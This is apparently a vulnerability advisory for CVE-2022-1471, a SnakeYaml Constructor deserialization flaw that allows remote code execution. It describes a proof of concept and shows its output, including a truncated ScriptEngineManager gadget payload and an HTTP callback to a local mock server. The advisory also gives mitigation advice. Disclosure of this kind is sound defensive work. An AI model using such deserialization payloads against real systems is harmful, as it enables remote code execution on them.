summary: "SnakeYaml Constructor Deserialization Remote Code Execution\n### Summary\nSnakeYaml's\
  \ `Constructor` class, which inherits from `SafeConstructor`, allows\nany type be deserialized\
  \ given the following line:\n\nnew Yaml(new Constructor(TestDataClass.class)).load(yamlContent);\n\
  \nTypes do not have to match the types of properties in the\ntarget class. A `ConstructorException`\
  \ is thrown, but only after a malicious\npayload is deserialized.\n\n### Severity\nHigh, lack\
  \ of type checks during deserialization allows remote code execution.\n\n### Proof of Concept\n\
  Execute `bash run.sh`. The PoC uses Constructor to deserialize a payload\nfor RCE. RCE is\
  \ demonstrated by using a payload which performs a http request to\nhttp://127.0.0.1:8000.\n\
  \nExample output of successful run of proof of concept:\n\n```\n$ bash run.sh\n\n[+] Downloading\
  \ snakeyaml if needed\n[+] Starting mock HTTP server on 127.0.0.1:8000 to demonstrate RCE\n\
  nc: no process found\n[+] Compiling and running Proof of Concept, which a payload that sends\
  \ a HTTP request to mock web server.\n[+] An exception is expected.\nException:\nCannot create\
  \ property=payload for JavaBean=Main$TestDataClass@3cbbc1e0\n in 'string', line 1, column\
  \ 1:\n    payload: !!javax.script.ScriptEn ... \n    ^\nCan not set java.lang.String field\
  \ Main$TestDataClass.payload to javax.script.ScriptEngineManager\n in 'string', line 1, column\
  \ 10:\n    payload: !!javax.script.ScriptEngineManag ... \n             ^\n\n\tat org.yaml.snakeyaml.constructor.Constructor$ConstructMapping.constructJavaBean2ndStep(Constructor.java:291)\n\
  \tat org.yaml.snakeyaml.constructor.Constructor$ConstructMapping.construct(Constructor.java:172)\n\
  \tat org.yaml.snakeyaml.constructor.Constructor$ConstructYamlObject.construct(Constructor.java:332)\n\
  \tat org.yaml.snakeyaml.constructor.BaseConstructor.constructObjectNoCheck(BaseConstructor.java:230)\n\
  \tat org.yaml.snakeyaml.constructor.BaseConstructor.constructObject(BaseConstructor.java:220)\n\
  \tat org.yaml.snakeyaml.constructor.BaseConstructor.constructDocument(BaseConstructor.java:174)\n\
  \tat org.yaml.snakeyaml.constructor.BaseConstructor.getSingleData(BaseConstructor.java:158)\n\
  \tat org.yaml.snakeyaml.Yaml.loadFromReader(Yaml.java:491)\n\tat org.yaml.snakeyaml.Yaml.load(Yaml.java:416)\n\
  \tat Main.main(Main.java:37)\nCaused by: java.lang.IllegalArgumentException: Can not set java.lang.String\
  \ field Main$TestDataClass.payload to javax.script.ScriptEngineManager\n\tat java.base/jdk.internal.reflect.UnsafeFieldAccessorImpl.throwSetIllegalArgumentException(UnsafeFieldAccessorImpl.java:167)\n\
  \tat java.base/jdk.internal.reflect.UnsafeFieldAccessorImpl.throwSetIllegalArgumentException(UnsafeFieldAccessorImpl.java:171)\n\
  \tat java.base/jdk.internal.reflect.UnsafeObjectFieldAccessorImpl.set(UnsafeObjectFieldAccessorImpl.java:81)\n\
  \tat java.base/java.lang.reflect.Field.set(Field.java:780)\n\tat org.yaml.snakeyaml.introspector.FieldProperty.set(FieldProperty.java:44)\n\
  \tat org.yaml.snakeyaml.constructor.Constructor$ConstructMapping.constructJavaBean2ndStep(Constructor.java:286)\n\
  \t... 9 more\n[+] Dumping Received HTTP Request. Will not be empty if PoC worked\nGET /proof-of-concept\
  \ HTTP/1.1\nUser-Agent: Java/11.0.14\nHost: localhost:8000\nAccept: text/html, image/gif,\
  \ image/jpeg, *; q=.2, */*; q=.2\nConnection: keep-alive\n```\n\n### Further Analysis\nPotential\
  \ mitigations include, leveraging SnakeYaml's SafeConstructor while parsing untrusted content.\n\
  \nSee https://bitbucket.org/snakeyaml/snakeyaml/issues/561/cve-2022-1471-vulnerability-in#comment-64581479\
  \ for discussion on the subject.\n\n### Timeline\n**Date reported**: 4/11/2022\n**Date fixed**:\
  \  [30/12/2022](https://bitbucket.org/snakeyaml/snakeyaml/pull-requests/44)\n**Date disclosed**:\
  \ 10/13/2022"
